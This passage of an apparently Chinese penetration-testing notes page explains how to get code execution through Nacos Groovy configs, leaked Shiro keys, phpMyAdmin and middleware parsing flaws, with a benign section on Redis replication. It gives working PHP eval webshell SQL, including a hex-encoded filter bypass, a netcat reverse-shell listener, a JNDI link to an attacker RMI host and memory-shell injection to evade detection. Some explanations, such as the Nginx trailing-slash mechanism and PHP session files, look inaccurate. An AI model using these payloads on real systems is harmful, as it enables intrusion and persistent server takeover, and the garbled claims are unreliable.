<p><strong>3. 发布配置并触发</strong></p>
<ul>
<li><strong>发布配置</strong>：填写好 Data ID、Group 和恶意 Groovy 代码后，点击“发布”</li>
<li><strong>触发条件</strong>：<ul>
<li><strong>应用程序加载配置</strong>：目标应用程序需要集成 Nacos 并加载这个新发布的配置。通常，应用程序会通过 Nacos SDK 定期拉取配置。一旦应用加载了 <code>shell.groovy</code> 这个配置，Groovy 代码就会被执行</li>
<li><strong>配置刷新</strong>：许多 Spring Boot 等应用框架在集成 Nacos 时，会配置自动刷新。当配置有更新时，应用会重新加载。</li>
</ul>
</li>
</ul>
<p><strong>4. 获取 Shell</strong></p>
<ul>
<li><strong>反弹 Shell</strong>：在发布恶意配置前，需要在攻击者服务器上使用 <code>nc</code> 命令监听端口，例如 <code>nc -lvnp 端口</code>。一旦目标应用加载配置，你就会在监听端口上收到一个反弹回来的 Shell</li>
<li><strong>命令执行</strong>：如果使用命令执行的方式，执行结果会显示在 Nacos 的日志或应用日志中。但这种方式需要你多次修改配置来执行不同的命令，无法形成一个交互式的 Shell</li>
</ul>
<h3 id="Nacos-不出网利用方式"><a href="#Nacos-不出网利用方式" class="headerlink" title="Nacos 不出网利用方式"></a>Nacos 不出网利用方式</h3><p><strong>1. 构造恶意 Groovy 配置文件</strong></p>
<p>与之前的方法类似，我们需要构造一个恶意 Groovy 脚本。这次，我们的目标是让命令执行的结果能够被我们看到</p>
<ul>
<li><strong>Data ID</strong>：任意命名，例如 <code>internal-shell.groovy</code></li>
<li><strong>配置格式</strong>：<code>Groovy</code></li>
<li><strong>配置内容</strong>：</li>
</ul>
<p>我们可以将命令执行的结果写入到一个可写的文件中。以下是一个示例，它会执行 <code>ifconfig</code> 命令，并将结果写入到 <code>/tmp/nacos-result.txt</code> 文件中</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> process = <span class="string">&quot;ifconfig&quot;</span>.execute()</span><br><span class="line"><span class="keyword">def</span> output = <span class="keyword">new</span> StringBuilder()</span><br><span class="line">process.consumeProcessOutput(output, output)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> file = <span class="keyword">new</span> File(<span class="string">&quot;/tmp/nacos-result.txt&quot;</span>)</span><br><span class="line">file.withWriter(<span class="string">&#x27;UTF-8&#x27;</span>) &#123; writer -&gt;</span><br><span class="line">    writer.write(output.toString())</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>请将 <code>ifconfig</code> 替换为你想要执行的命令，并将 <code>/tmp/nacos-result.txt</code> 替换为一个你确定有写入权限的路径</p>
<p><strong>2. 发布配置并触发</strong></p>
<p>在 Nacos 控制台中发布这个恶意配置，等待目标应用加载配置并执行。一旦应用加载了该配置，Groovy 脚本就会在服务器上执行，并将命令执行结果写入指定的文件中</p>
<p><strong>3. 获取命令执行结果</strong></p>
<p>现在，最关键的问题是如何获取到写入文件的结果。这通常需要依赖于以下两种情况：</p>
<ul>
<li><strong>有文件下载或读取接口</strong>：如果目标服务器的应用存在文件下载功能，并且我们可以控制下载路径，那么我们可以通过这个功能来下载 <code>/tmp/nacos-result.txt</code> 文件，从而获取命令执行的结果。</li>
<li><strong>通过 Nacos 控制台回显</strong>：在某些情况下，Nacos 的配置加载可能会在应用的日志中打印出结果。如果我们可以访问到应用的日志，那么也可以从中获取信息。但这种方式不够稳定和通用</li>
</ul>
<p><strong>4. 自动化命令执行（进阶）</strong></p>
<p>如果需要进行多次命令执行，每次都修改配置并发布会非常麻烦。我们可以利用 Nacos 的 API 来实现自动化</p>
<ul>
<li><strong>1.0 版本的 API</strong>：<ul>
<li><strong>获取配置内容</strong>：<code>GET /nacos/v1/cs/configs?dataId=&lt;dataId&gt;&amp;group=&lt;group&gt;</code></li>
<li><strong>修改配置内容</strong>：<code>POST /nacos/v1/cs/configs</code></li>
</ul>
</li>
<li><strong>2.0 版本的 API</strong>：<ul>
<li><strong>获取配置内容</strong>：<code>POST /nacos/v2/cs/configs</code></li>
<li><strong>修改配置内容</strong>：<code>POST /nacos/v2/cs/configs</code></li>
</ul>
</li>
</ul>
<p>我们可以编写一个脚本，循环执行以下操作：</p>
<ol>
<li><strong>构造 Groovy 脚本</strong>，将要执行的命令写入其中</li>
<li><strong>通过 API 更新配置</strong></li>
<li><strong>通过 API 获取配置</strong>，并尝试从中提取命令执行结果（如果结果被写入配置中）</li>
<li><strong>通过文件下载接口</strong>或其他方式获取结果</li>
</ol>
<h3 id="do-文件是哪种框架"><a href="#do-文件是哪种框架" class="headerlink" title=".do 文件是哪种框架"></a>.do 文件是哪种框架</h3><p><strong>Struts 1 框架</strong>：为了实现更好的代码结构和分层，Struts 1 引入了控制器（Controller）的概念。它将所有请求统一通过一个核心的 <code>ActionServlet</code> 来处理。为了区分这些请求，开发者通常会为它们设置一个统一的扩展名，<code>.do</code> 就是最常见的选择</p>
<hr>
<h3 id="Shiro-有-Key-无链怎么利用"><a href="#Shiro-有-Key-无链怎么利用" class="headerlink" title="Shiro 有 Key 无链怎么利用"></a>Shiro 有 Key 无链怎么利用</h3><p><strong>1. 内存马注入</strong></p>
<p>这是目前最主流且最有效的利用方法之一。如果能通过反序列化注入一个内存马，我们就可以直接与服务器进行交互，绕过 WAF、IDS 等安全设备，并且不留下任何磁盘文件</p>
<p><strong>利用原理</strong>：</p>
<ul>
<li><strong>自定义反序列化类</strong>：我们需要构造一个恶意的序列化数据，其中包含一个自定义的类</li>
<li><strong>反射机制</strong>：这个自定义类在反序列化时，其 <code>readObject</code> 方法会被调用。我们利用反射机制，在 <code>readObject</code> 方法中获取当前应用的 <code>ServletContext</code></li>
<li><strong>注入 Webshell</strong>：有了 <code>ServletContext</code>，我们就可以动态地注册一个 Servlet、Filter 或者 Listener，从而注入一个内存 Webshell</li>
</ul>
<p><strong>具体步骤</strong>：</p>
<ol>
<li><strong>编写内存马代码</strong>：使用 Java 编写一个内存马，通常是一个 Filter 或 Servlet，用于接收请求并执行命令</li>
<li><strong>构造恶意序列化数据</strong>：将内存马代码嵌入到序列化数据中</li>
<li><strong>加密</strong>：使用泄露的 Shiro Key，对这个序列化数据进行 AES 加密</li>
<li><strong>发送请求</strong>：将加密后的数据作为 RememberMe cookie 的值发送到服务器</li>
<li><strong>反序列化</strong>：Shiro 框架会解密并反序列化这个 cookie，从而触发我们的恶意代码，实现内存马注入</li>
</ol>
<p><strong>优势</strong>：</p>
<ul>
<li><strong>绕过传统安全设备</strong>：内存马直接运行在内存中，不依赖于文件，因此可以绕过绝大部分基于文件扫描的 WAF 和杀毒软件</li>
<li><strong>无文件落地</strong>：攻击不留下任何磁盘痕迹，增加了溯源的难度</li>
</ul>
<p><strong>2. RMI 远程加载</strong></p>
<p>这种方法利用了 Java 的远程方法调用（RMI）机制，通过反序列化来触发远程加载恶意代码</p>
<p><strong>利用原理</strong>：</p>
<ul>
<li><strong>JNDI 注入</strong>：反序列化时，我们可以构造一个 <code>com.sun.jndi.rmi.registry.RegistryContext</code> 对象，通过 JNDI 注入的方式，让服务器去连接一个我们控制的 RMI 服务器</li>
<li><strong>远程加载 Class 文件</strong>：RMI 服务器会返回一个恶意对象，该对象会触发服务器远程加载并实例化我们提供的恶意 Class 文件</li>
</ul>
<p><strong>具体步骤</strong>：</p>
<ol>
<li><strong>搭建 RMI Server</strong>：利用 <code>ysoserial</code> 或自定义代码搭建一个恶意的 RMI 服务器</li>
<li><strong>编写恶意 Class</strong>：编写一个恶意的 Class 文件，其中包含要执行的命令</li>
<li><strong>构造恶意序列化数据</strong>：构造一个包含 JNDI 注入链接的序列化数据，例如 <code>rmi://attacker_ip:port/EvilObject</code></li>
<li><strong>加密并发送</strong>：使用 Shiro Key 对数据进行加密，并作为 RememberMe cookie 发送</li>
<li><strong>反序列化触发</strong>：服务器反序列化时，会触发 JNDI 注入，连接我们的 RMI 服务器并加载恶意 Class，最终实现命令执行</li>
</ol>
<p><strong>限制</strong>：</p>
<ul>
<li>需要目标服务器能够访问外网或者我们内网的 RMI 服务器</li>
<li>Java 版本对 JNDI 注入有一定限制，高版本可能需要额外配置</li>
</ul>
<hr>
<h3 id="Redis-主从复制原理"><a href="#Redis-主从复制原理" class="headerlink" title="Redis 主从复制原理"></a>Redis 主从复制原理</h3><p><strong>1. 工作原理概述</strong></p>
<p>Redis 主从复制本质上是<strong>从节点主动向主节点请求数据同步</strong>的过程。它通过两种方式来完成数据的同步：</p>
<ol>
<li>**全量复制：当从节点第一次连接主节点，或者无法进行增量复制时，主节点会把所有数据完整地同步给从节点</li>
<li>**增量复制：在主从连接断开后重新连接时，主节点会尝试只同步断开期间产生的写命令，以减少数据同步的开销</li>
</ol>
<p><strong>2. 复制过程详解</strong></p>
<p>​	<strong>2.1 建立连接与请求同步</strong></p>
<p>​	从节点启动后，会根据配置文件中的 <code>slaveof &lt;master_ip&gt; &lt;master_port&gt;</code> 命令，向主节点发起连接。一旦连接建	立，从节点会发送 <code>PSYNC ? -1</code> 命令，表明它希望进行同步，并请求主节点的复制ID和复制偏移量</p>
<p>​	<strong>2.2 全量复制</strong></p>
<p>​	全量复制是数据同步的“大动作”，通常发生在以下情况：</p>
<ul>
<li>从节点首次连接主节点</li>
<li>主从连接断开时间过长，无法进行增量复制</li>
</ul>
<p>​	这个过程主要分为以下几个步骤：</p>
<ol>
<li><strong>主节点执行 <code>BGSAVE</code></strong>：主节点会创建一个子进程，将当前内存中的所有数据快照保存到一个 <strong>RDB 文件</strong>中。这个过程是<strong>非阻塞</strong>的，主节点仍然可以继续处理客户端的请求</li>
<li><strong>主节点发送 RDB 文件</strong>：一旦 RDB 文件生成完毕，主节点会将其通过网络发送给从节点</li>
<li><strong>主节点缓存新命令</strong>：在 RDB 文件生成和传输期间，主节点会将所有新产生的写命令缓存在一个<strong>复制积压缓冲区</strong>中</li>
<li><strong>从节点清空并加载数据</strong>：从节点接收到 RDB 文件后，会先清空自身所有旧数据，然后加载 RDB 文件。加载完成后，从节点就拥有了与主节点在 RDB 生成那一刻完全一致的数据</li>
<li><strong>主节点发送缓存命令</strong>：RDB 加载完成后，主节点会将之前在缓冲区中缓存的所有新命令发送给从节点，从节点接收并执行这些命令，从而实现最终的数据同步</li>
</ol>
<p>​	<strong>2.3 增量复制</strong></p>
<p>​	为了避免每次短暂的网络中断都触发耗时的全量复制，Redis 2.8 及以上版本引入了增量复制。它的核心在于：</p>
<ul>
<li><strong>复制偏移量</strong>：主从节点都会维护一个偏移量，记录已经同步了多少字节的数据</li>
<li><strong>复制积压缓冲区</strong>：主节点会维护一个固定大小的循环缓冲区。所有新的写命令都会被写入这个缓冲区</li>
</ul>
<p>​	当主从连接断开后，从节点会记住自己的复制偏移量。重新连接时，它会发送 <code>PSYNC &lt;master_replid&gt; &lt;offset&gt;</code> 	命令，请求从指定偏移量开始同步</p>
<p>​	主节点收到请求后，会检查从节点请求的偏移量是否还在自己的复制积压缓冲区中：</p>
<ul>
<li><strong>如果在</strong>：说明缓冲区里有从节点需要的数据。主节点会从缓冲区中找到对应的数据，并发送给从节点，从而快速完成同步</li>
<li><strong>如果不在</strong>：说明连接中断时间太长，缓冲区中的旧数据已经被新数据覆盖了。此时，主节点会强制执行<strong>全量复制</strong></li>
</ul>
<p><strong>3. Redis 主从复制的优缺点</strong></p>
<p><strong>优点</strong></p>
<ul>
<li><strong>读写分离</strong>：可以将大量的读请求分发到从节点，减轻主节点的压力，提高系统的并发处理能力</li>
<li><strong>数据备份</strong>：从节点作为主节点的数据热备，可以在主节点故障时提供数据保障</li>
<li><strong>高可用性</strong>：配合哨兵（Sentinel）或集群（Cluster）模式，可以实现故障自动转移，保证服务的高可用</li>
</ul>
<p><strong>缺点</strong></p>
<ul>
<li><strong>异步复制</strong>：主从复制是异步的，主节点将数据同步给从节点是有一个延时的。如果主节点在同步完成前发生故障，可能会造成少量数据丢失</li>
<li><strong>配置复杂性</strong>：需要额外的服务器资源来部署从节点，并且需要进行维护和监控，增加了系统的复杂性</li>
</ul>
<hr>
<h3 id="phpMyAdmin-写-Shell-的方法"><a href="#phpMyAdmin-写-Shell-的方法" class="headerlink" title="phpMyAdmin 写 Shell 的方法"></a>phpMyAdmin 写 Shell 的方法</h3><p><strong>1. 利用 <code>SELECT ... INTO OUTFILE</code> 或 <code>DUMPFILE</code></strong></p>
<p>这是最常用、最经典的 phpMyAdmin 写 Shell 方法。<code>INTO OUTFILE</code> 和 <code>DUMPFILE</code> 语句都允许将查询结果写入文件</p>
<ul>
<li><p><strong>前提条件：</strong></p>
<ul>
<li>数据库用户具有 <code>FILE</code> 权限</li>
<li>目标服务器上的 MySQL 用户可以对网站目录有写入权限</li>
<li><code>secure_file_priv</code> 参数没有被设置或被设置为可以写入的目录。如果这个参数被设置为 <code>NULL</code>，则该方法会失效</li>
</ul>
</li>
<li><p><strong>操作步骤：</strong></p>
<ol>
<li>登录 phpMyAdmin</li>
<li>进入 SQL 查询页面</li>
<li>构造并执行 SQL 语句。通常，我们会写入一个简单的 PHP WebShell</li>
</ol>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:/xampp/htdocs/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>或者使用十六进制编码来绕过可能的过滤：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="number">0x3c3f70687020406576616c28245f504f53545b22636d64225d293b3f3e</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>优点：</strong> 简单直接，成功率高</p>
</li>
<li><p><strong>缺点：</strong> 依赖于 MySQL 用户的 <code>FILE</code> 权限和服务器配置</p>
</li>
</ul>
<p><strong>2. 利用日志文件写 Shell</strong></p>
<p>当 <code>INTO OUTFILE</code> 无法使用时，日志文件是一个很好的替代方案。如果 MySQL 的<strong>通用查询日志</strong>（general log）或<strong>慢查询日志</strong>（slow query log）是开启的，并且日志文件可写，我们就可以利用这个特性来写入 WebShell</p>
<ul>
<li><p><strong>操作步骤：</strong></p>
<ol>
<li><p><strong>查看日志状态：</strong> 登录 phpMyAdmin，执行以下 SQL 语句来查看通用日志的开启状态和日志路径</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log&#x27;</span>;</span><br><span class="line"><span class="keyword">SHOW</span> VARIABLES <span class="keyword">LIKE</span> <span class="string">&#x27;general_log_file&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>设置日志路径：</strong> 将日志路径设置为网站可访问的目录，例如 <code>/var/www/html/shell.php</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log_file <span class="operator">=</span> <span class="string">&#x27;/var/www/html/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>开启日志：</strong> 开启通用查询日志</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="string">&#x27;ON&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>执行恶意查询：</strong> 构造一个查询，其中包含我们的 WebShell 代码</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure>

<p>这条查询语句和它的结果会被写入到 <code>shell.php</code> 文件中</p>
</li>
<li><p><strong>关闭日志（可选）：</strong> 为了避免日志文件过大，可以再次关闭它</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SET</span> <span class="keyword">GLOBAL</span> general_log <span class="operator">=</span> <span class="string">&#x27;OFF&#x27;</span>;</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p><strong>优点：</strong> 绕过了 <code>secure_file_priv</code> 的限制，只要有 <code>SUPER</code> 权限即可</p>
</li>
<li><p><strong>缺点：</strong> 需要 MySQL 用户拥有 <code>SUPER</code> 权限，并且日志功能必须是开启的，或者我们有权限开启它</p>
</li>
</ul>
<p><strong>3. 利用 <code>phpMyAdmin</code> 导入功能</strong></p>
<p>这是最常用且最有效的方法之一。<code>phpMyAdmin</code> 的导入功能允许用户上传一个 <code>.sql</code> 文件，并执行其中的 SQL 语句。如果文件内容可控，我们就可以利用这个功能来写入 WebShell</p>
<ul>
<li><p><strong>前提条件：</strong></p>
<ul>
<li>拥有一个可上传的 <code>.sql</code> 文件</li>
<li>具有导入数据库的权限</li>
</ul>
</li>
<li><p><strong>操作步骤：</strong></p>
<ol>
<li><p>创建一个 <code>.sql</code> 文件，文件内容为写入 WebShell 的 SQL 语句。例如，使用 <code>SELECT ... INTO OUTFILE</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- shell.sql</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span> <span class="keyword">INTO</span> OUTFILE <span class="string">&#x27;C:/xampp/htdocs/shell.php&#x27;</span>;</span><br></pre></td></tr></table></figure>
</li>
<li><p>登录 <code>phpMyAdmin</code>，选择一个数据库</p>
</li>
<li><p>点击导航栏的“导入”选项卡</p>
</li>
<li><p>选择你创建的 <code>shell.sql</code> 文件，然后点击“执行”按钮</p>
</li>
<li><p><code>phpMyAdmin</code> 会执行 <code>shell.sql</code> 中的 SQL 语句，从而在服务器上写入 WebShell</p>
</li>
</ol>
</li>
</ul>
<p><strong>4. 利用 <code>phpMyAdmin</code> 文件导出功能</strong></p>
<p>这个方法与导入功能相反，它利用的是导出功能。在某些配置下，<code>phpMyAdmin</code> 允许将数据库或表中的数据导出为文件。</p>
<ul>
<li><p><strong>前提条件：</strong></p>
<ul>
<li>数据库用户具有 <code>FILE</code> 权限</li>
<li><code>secure_file_priv</code> 参数没有限制</li>
<li>需要创建一个包含 WebShell 代码的表</li>
</ul>
</li>
<li><p><strong>操作步骤：</strong></p>
<ol>
<li><p>登录 <code>phpMyAdmin</code>，进入一个数据库，然后点击“SQL”选项卡</p>
</li>
<li><p>创建一个新的表，将 WebShell 代码作为一行数据插入进去</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE TABLE</span> `shell_table` (`data` TEXT <span class="keyword">NOT NULL</span>);</span><br><span class="line"><span class="keyword">INSERT INTO</span> `shell_table` (`data`) <span class="keyword">VALUES</span> (<span class="string">&#x27;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p>点击“导出”选项卡，选择刚才创建的 <code>shell_table</code> 表</p>
</li>
<li><p>在导出选项中，选择导出为 <code>.sql</code> 文件，并勾选“导出为独立文件”</p>
</li>
<li><p>修改导出路径，将其指向网站可访问的目录，例如 <code>/var/www/html/shell.php</code></p>
</li>
<li><p>点击“执行”，<code>phpMyAdmin</code> 就会将包含 WebShell 代码的表数据导出为 <code>shell.php</code> 文件</p>
</li>
</ol>
</li>
</ul>
<p><strong>5. 利用 <code>phpMyAdmin</code> <code>PHPMYADMIN</code> 配置文件</strong></p>
<p>这是一种更高级、更具技巧性的方法，它利用了 <code>phpMyAdmin</code> 自身的配置文件。在某些旧版本或配置不当的环境中，<code>phpMyAdmin</code> 允许通过后台界面修改一些配置</p>
<ul>
<li><strong>前提条件：</strong><ul>
<li><code>phpMyAdmin</code> 版本存在相关漏洞，例如 <code>PHPMYADMIN</code> 4.0.0-4.0.5 之间的版本</li>
<li>拥有足够的权限来修改配置</li>
</ul>
</li>
<li><strong>操作步骤：</strong><ol>
<li>登录 <code>phpMyAdmin</code>，进入“设置”页面</li>
<li>寻找允许修改文件路径或文件名的选项，例如“导出文件路径”或“临时目录”</li>
<li>将这些路径修改为包含 WebShell 代码的文件名，例如 <code>shell.php</code></li>
<li>在某个地方输入 WebShell 代码，当 <code>phpMyAdmin</code> 尝试使用这个修改后的路径时，就会将 WebShell 代码写入文件</li>
</ol>
</li>
</ul>
<p><strong>6. 利用 <code>phpMyAdmin</code> <code>SESSION</code> 文件写 <code>SHELL</code></strong></p>
<p>这个方法是利用 <code>phpMyAdmin</code> 处理会话文件时的漏洞</p>
<ul>
<li><strong>前提条件：</strong><ul>
<li><code>phpMyAdmin</code> 的会话文件可控</li>
<li>具有足够的权限</li>
</ul>
</li>
<li><strong>操作步骤：</strong><ol>
<li>在登录 <code>phpMyAdmin</code> 的过程中，构造一个恶意的 <code>SQL</code> 查询，其中包含 WebShell 代码</li>
<li>由于 <code>phpMyAdmin</code> 会将会话信息保存在服务器的 <code>SESSION</code> 文件中，如果其没有对输入进行严格过滤，那么恶意代码可能会被写入 <code>SESSION</code> 文件</li>
<li>找到 <code>SESSION</code> 文件的路径，然后访问该文件。由于会话文件是 PHP 文件，其中的恶意代码会被执行，从而获得 WebShell</li>
</ol>
</li>
</ul>
<hr>
<h3 id="了解过哪些中间件解析漏洞"><a href="#了解过哪些中间件解析漏洞" class="headerlink" title="了解过哪些中间件解析漏洞"></a>了解过哪些中间件解析漏洞</h3><p><strong>1. Apache 解析漏洞</strong></p>
<p>Apache 的解析漏洞多与其 <code>.htaccess</code> 配置文件有关。如果攻击者可以上传一个 <code>.htaccess</code> 文件到某个目录下，就可以通过修改配置来改变文件解析规则</p>
<ul>
<li><strong>多后缀解析</strong>：Apache 会从文件名的右侧向左开始解析，直到遇到一个已知的可执行后缀<ul>
<li><strong>文件名</strong>：<code>shell.php.jpg</code></li>
<li><strong>漏洞原理</strong>：如果 Apache 的配置文件中没有对 <code>.jpg</code> 后缀进行处理，它会继续向左解析，直到遇到 <code>.php</code>，然后将其当作 PHP 脚本执行</li>
</ul>
</li>
<li><strong><code>.htaccess</code> 文件覆盖</strong>：<ul>
<li>攻击者上传一个 <code>.htaccess</code> 文件，内容为 <code>AddHandler php5-script .jpg</code></li>
<li>然后上传一个名为 <code>shell.jpg</code> 的文件，其中包含 PHP 代码</li>
<li>Apache 看到 <code>.htaccess</code> 文件后，会将所有 <code>.jpg</code> 文件都当作 PHP 脚本来执行，从而导致代码执行</li>
</ul>
</li>
</ul>
<p><strong>2. Nginx 解析漏洞 (Nginx + PHP-FPM)</strong></p>
<p>这是最著名的解析漏洞之一，尤其是在 Nginx 0.8.x 到 1.4.x 的版本中，配置不当极易引发</p>
<ul>
<li><strong>漏洞原理</strong>：当 Nginx 遇到一个以 <code>/</code> 结尾的 URL 请求（例如 <code>http://example.com/shell.jpg/</code>），且该路径对应一个文件时，它会认为这是一个目录，并尝试找到目录下的默认文件（如 <code>index.php</code>）。如果找不到，它会继续将请求发送给 PHP-FPM 处理。PHP-FPM 在处理时，会认为这是一个 PHP 文件，并执行其中的代码</li>
<li><strong>更严重的版本</strong>：攻击者上传 <code>shell.jpg</code>，然后访问 <code>http://example.com/shell.jpg/evil.php</code>。Nginx 会认为 <code>/evil.php</code> 需要被 PHP 处理，于是将整个 <code>shell.jpg</code> 文件发送给 PHP-FPM。PHP-FPM 在执行时会忽略 <code>.jpg</code> 部分，只执行文件中的 PHP 代码</li>
</ul>
<p><strong>3. IIS 解析漏洞</strong></p>
<p>IIS 早期版本（特别是 IIS 6.0）存在多个经典解析漏洞</p>
<ul>
<li><strong>分号解析漏洞</strong>：IIS 遇到 <code>*.asp;.jpg</code> 这类文件名时，会忽略分号之后的内容，将其当作 <code>*.asp</code> 文件来处理<ul>
<li><strong>文件名</strong>：<code>shell.asp;.jpg</code></li>
<li><strong>漏洞原理</strong>：攻击者可以上传这个文件，IIS 会将其当作 ASP 脚本执行</li>
</ul>
</li>
<li><strong>目录解析漏洞</strong>：IIS 6.0 会将含有 <code>*.asp</code>、<code>*.asa</code> 等可执行后缀的文件夹中的所有文件都当作可执行脚本<ul>
<li><strong>操作</strong>：攻击者创建一个名为 <code>shell.asp</code> 的目录，然后在该目录中上传一个名为 <code>image.jpg</code> 的文件</li>
<li><strong>漏洞原理</strong>：访问 <code>http://example.com/shell.asp/image.jpg</code> 时，IIS 会将 <code>image.jpg</code> 当作 ASP 脚本执行</li>
</ul>
</li>
</ul>
<hr>
<h3 id="Shiro-不出网怎么利用"><a href="#Shiro-不出网怎么利用" class="headerlink" title="Shiro 不出网怎么利用"></a>Shiro 不出网怎么利用</h3><p><strong>1. 利用内存马</strong></p>
<p>这是最常见且有效的方法之一。<strong>内存马</strong>是一种将恶意代码直接注入到目标服务器内存中的技术，它不会在磁盘上留下任何文件，因此难以被传统的杀毒软件和文件监控系统发现</p>
<p><strong>实现思路：</strong></p>
<ul>
<li><strong>注入 WebShell：</strong> 通过 Shiro 反序列化漏洞执行一个内存中的 Shell 代码。这个 Shell 通常是一个 Servlet、Filter 或者 JSP 的形式。它接收你的 HTTP 请求，然后执行命令并将结果通过 HTTP 响应返回</li>
<li><strong>通信方式：</strong> 你需要找到一个能够与目标服务器交互的 HTTP 端点（Endpoint）。例如，你可以注入一个 Filter，它会监听特定的 URL 路径，当你的请求命中这个路径时，Filter 就会被触发，执行你传入的命令，然后将命令执行结果作为 HTTP 响应的一部分返回给你</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>隐蔽性高，不依赖外网连接</li>
<li>可以绕过很多安全检测</li>
<li>可以实现双向通信，方便后续操作</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>需要一定的 Java 基础和内存马编写能力</li>
<li>服务器重启后，内存马会消失</li>
</ul>
<p><strong>2. 利用 JRMP 协议进行反向连接</strong></p>
<p>如果目标服务器能够出网，但限制了 HTTP&#x2F;HTTPS 协议，你还可以尝试通过其他协议进行反向连接。JRMP（Java Remote Method Protocol）是 Java RMI (Remote Method Invocation) 的底层协议，可以用于远程调用对象</p>
<p><strong>实现思路：</strong></p>
<ul>
<li><strong>创建 JRMPListener：</strong> 在你的攻击机上运行一个 JRMPListener，这个 Listener 监听一个端口，等待目标服务器连接</li>
<li><strong>Shiro 利用链：</strong> 使用 Shiro 反序列化漏洞，在目标服务器上执行一段代码，这段代码会去连接你的 JRMPListener</li>
<li><strong>获取 Shell：</strong> 一旦连接建立，你可以通过这个通道在目标服务器上执行命令或者进行其他操作</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>利用 JRMP 协议，绕过一些基于 HTTP&#x2F;HTTPS 的网络限制</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li>依然需要目标服务器能够出网</li>
<li>需要编写或使用专门的 JRMP 利用工具</li>
</ul>
<p><strong>3. 利用文件操作</strong></p>
<p>虽然不能出网，但我们仍然可以利用 Shiro 反序列化漏洞来操作服务器上的文件</p>
<p><strong>实现思路：</strong></p>
<ul>
<li><strong>写入 WebShell：</strong> 通过反序列化漏洞，执行文件写入操作，将一个 WebShell 文件（例如 <code>webshell.jsp</code>）写入到目标服务器的 Web 目录下</li>
<li><strong>利用已有的 WebShell：</strong> 如果你发现服务器上已经存在一个可写的目录，或者存在一些可以被利用的日志文件等，也可以将命令执行的结果写入到这些文件中</li>
</ul>
<p><strong>具体步骤：</strong></p>
<ul>
<li>使用 <code>URLDNS</code> 或者其他利用链来验证漏洞存在性</li>
<li>找到一个可写的路径，例如 <code>webapps/ROOT/</code> 目录</li>
<li>构造一个恶意的序列化 payload，其中包含写入文件的操作。例如，可以使用 <code>CommonsCollections</code> 或者 <code>Jdk7u21</code> 等利用链，然后调用 <code>Runtime.exec()</code> 来执行 <code>echo &quot;恶意代码&quot; &gt; /path/to/shell.jsp</code> 命令</li>
</ul>
<p><strong>优点：</strong></p>
<ul>
<li>不需要服务器出网</li>
<li>操作直观，容易理解</li>
</ul>
<p><strong>缺点：</strong></p>
<ul>
<li><strong>权限问题：</strong> 需要目标服务器用户具有写入权限</li>
<li><strong>路径问题：</strong> 需要知道 Web 目录的绝对路径，或者通过其他方式推测</li>
</ul>
<p><strong>4. 命令执行带回显</strong></p>
<p>如果目标服务器不出网，但我们仍然可以执行命令，那么如何看到命令执行的结果呢？</p>
<p><strong>实现思路：</strong></p>
<ul>
<li><strong>写入文件，然后读取：</strong> 执行命令，并将命令执行的结果重定向到一个可读的目录，例如 Web 目录下的一个新文件。然后，你再通过浏览器访问这个文件，就可以看到命令执行的结果了</li>
<li><strong>利用报错：</strong> 构造一个特殊的命令，使得命令执行结果作为错误信息输出。例如，一些命令在执行失败时会返回有用的信息</li>
</ul>
<p><strong>具体步骤：</strong></p>
<ul>
<li><strong>写入文件：</strong> <code>ls -la &gt; /tmp/result.txt</code></li>
